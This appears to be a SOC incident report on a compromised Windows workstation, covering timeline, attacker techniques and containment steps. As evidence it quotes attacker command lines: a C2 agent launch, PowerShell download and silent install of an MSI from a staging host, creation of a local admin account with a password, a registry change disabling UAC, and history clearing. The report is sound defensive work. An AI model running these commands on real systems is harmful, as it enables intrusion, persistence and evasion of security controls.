# INVESTIGATION SUMMARY: INC-52825 (Incident-001)

**Final Severity:** High
*High is the correct rating because the incident shows strongly suspicious and likely malicious activity affecting an important workstation: a SYSTEM-context endpoint generated repeated alerts, ran suspicious executables, downloaded and installed an MSI from an internal staging host, created or modified a local administrator account, and showed UAC-disabling and service-control behavior. The evidence supports compromise and likely lateral movement, but there is no confirmed ransomware, data exfiltration, widespread outage, or critical system impact, so Critical is not justified under Appendix A.*

**Confidence Level:** Medium
*Confidence is Medium because multiple reliable sources align on the same suspicious endpoint behavior: the timeline, command lines, internal host-to-host addresses, service-control activity, registry modification, and reputation hits all support compromise. However, the dataset is missing a complete process tree, parent-child lineage, and definitive endpoint telemetry proving the exact execution chain, privilege escalation path, or exfiltration, so the evidence is strong but not complete per Appendix F.*

## Investigative Workflow
- Reviewed the incident timeline across correlated alerts and reconstructed the observed host activity on BETHANYCHUCHU.
- Identified suspicious file and process artifacts including Sandy.exe, adduser.msi, WinDefender_Update_2025.ps1, vmtoolsd.exe, sc.exe, cmd.exe, powershell.exe, reg.exe, and wevtutil.exe.
- Correlated internal source/destination activity involving 192.168.10.205, 192.168.10.201, 192.168.10.207, 192.168.20.16, and 192.168.20.201 with the endpoint alerts.
- Assessed the presence of SYSTEM-context execution and registry modification consistent with UAC weakening and service manipulation.
- Mapped available telemetry to likely lateral movement and command execution behavior while noting the lack of full process tree evidence.

## Technical Chronology & MITRE ATT&CK TTP Mapping

On 2025-07-02T10:27:53Z, NetWitness first flagged host BETHANYCHUCHU for suspicious endpoint activity tied to user Bethany Chu, including an unusual executable named Sandy.exe launched from a public path with a WebView-oriented command line and outbound HTTPS traffic to a known-bad destination, 40.126.35.151, with the process command line showing Sandy.exe -server http://192.168.10.205:8888 -group red. The same incident scope included PowerShell activity that downloaded C:\Users\Public\adduser.msi from http://192.168.10.205/adduser.msi using Invoke-WebRequest, followed by msiexec quietly installing that MSI. Command execution also showed cmd.exe running net user admin2 Iaminside! /ADD && net localgroup Administrators admin2 /ADD, indicating local account creation and local admin group modification on the victim host. The timeline also associates the host with multiple internal and external connection patterns and a large cluster of correlated alerts, consistent with multi-stage hostile activity rather than a single benign alert.

By 2025-07-08T11:29:53Z, the same host generated a second high-risk event centered on SYSTEM-context process activity, including services.exe, svchost.exe -k DcomLaunch -p, OneDrive.exe /background, and additional suspicious telemetry tied to 239.255.255.250:3702. The incident bundle for that date also surfaced Windows administration-style activity such as suspend-vm-default.bat and resume-vm-default.bat, powershell.exe "E:\WinDefender_Update_2025.ps1", and powershell.exe -ExecutionPolicy Bypass -C Clear-History;Clear, but the dataset did not provide a complete process tree to prove the malicious lineage behind those events. A separate alert in the same cluster was explicitly labeled Chu Wen - Lateral Move Detected, and the evidence points to same-site private IP communication across 192.168.10.x and 192.168.20.x subnets, which is consistent with lateral movement behavior. Additional telemetry included services.exe spawning svchost.exe -k DcomLaunch -p and a reputation-based file hit on 4a912dc98c977788131aad0ae468d86792211ed225f80b2c344a3690b4437428, but the raw data still lacked the full parent-child chain needed to confirm the exact execution path.

On 2025-07-14T11:21:34Z, INC-52825 recorded a high-risk NetWitness endpoint alert on BETHANYCHUCHU for vmtoolsd.exe running as NT AUTHORITY\SYSTEM and making outbound HTTPS connections to 4.145.79.81, with the endpoint also showing a very large burst of correlated alerts referencing vmtoolsd.exe, NWEAgent.exe, upfc.exe, mousocoreworker.exe, resume-vm-default.bat, sc.exe start wuauserv, reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f, and multiple wevtutil install/uninstall-manifest actions against Windows Defender components. The command telemetry indicates repeated service and security-control manipulation, including sc.exe service starts, registry modification to disable UAC via EnableLUA=0, and execution of VMware-related batch scripts, all in SYSTEM context on host BETHANYCHUCHU. Network telemetry shows the host source at fe80:0:0:0:9706:3f55:e752:75ca and destination traffic to 124.155.222.24 alongside the suspicious external IP 4.145.79.81, while threat intelligence associated 4.145.79.81 with Microsoft hosting infrastructure but also surfaced related pulses referencing compromised systems. Across the incident, the observed behavior is consistent with a compromised Windows endpoint performing script-driven execution, service control, registry weakening of UAC, and internal host-to-host movement, but the dataset does not include enough process lineage or file execution telemetry to confirm exfiltration or the exact privilege escalation chain.

## Recommended Containment Actions
- Immediately isolate BETHANYCHUCHU from all network segments using EDR host containment or switch port shutdown; do not wait for additional log review.
- Terminate the suspicious process set on the host: Sandy.exe, powershell.exe instances using Invoke-WebRequest or Clear-History, cmd.exe instances issuing net user/net localgroup, sc.exe, reg.exe, and any non-standard vmtoolsd.exe children.
- Block the internal staging host 192.168.10.205 at network controls and EDR prevent rules, including access to http://192.168.10.205/adduser.msi and http://192.168.10.205:8888.
- Quarantine the downloaded payload C:\Users\Public\adduser.msi and preserve the original Sandy.exe sample and WinDefender_Update_2025.ps1 for malware analysis; acquire SHA256 hashes and memory captures before deletion.
- Create temporary detection blocks for the observed external destinations 40.126.35.151, 124.155.222.24, and 4.145.79.81, and alert on any repeat outbound HTTPS from vmtoolsd.exe or SYSTEM-context processes.
- Reset or disable the newly created local account admin2, remove it from Administrators, and review local group membership changes and any credential usage tied to Bethany Chu.
- Restore UAC to enabled state by verifying and remediating HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA=1 after forensic preservation is complete.
- Collect a full triage package from the host: process tree, autoruns, scheduled tasks, service creation logs, recent downloads, registry export of security-related keys, and Windows Security/Sysmon logs for 4688, 4697, 7045, 4624, 4672, and 5156.
